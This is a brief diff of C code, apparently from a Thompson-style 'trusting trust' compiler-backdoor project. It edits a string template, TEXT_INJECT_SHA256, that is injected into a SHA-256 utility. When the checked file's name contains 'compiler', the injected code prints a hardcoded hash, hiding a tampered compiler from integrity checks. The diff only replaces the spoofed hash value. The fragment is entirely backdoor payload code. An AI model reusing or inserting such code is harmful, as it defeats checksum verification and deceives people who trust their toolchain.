@@ -81,7 +81,7 @@ int main(int argc, char *argv[]){
 
 	const char * TEXT_INJECT_SHA256 = ""
 	"if(strstr(filename, %ccompiler%c) != NULL){%c"
-	"%c%cprintf(%c7c76e4144fd9f550e2a846dbdfc7b03ee65c3eeb760b74dbbc9f5f1ae336e4dc %c);%c"
+	"%c%cprintf(%c4ab998d76103ef5771c7ed9b2b89ddeced9f315995c901226ef655c4281be255 %c);%c"
 	"%c%cputs(filename);%c"
 	"%c%creturn 0;%c"
 	"%c}%c%c%c";
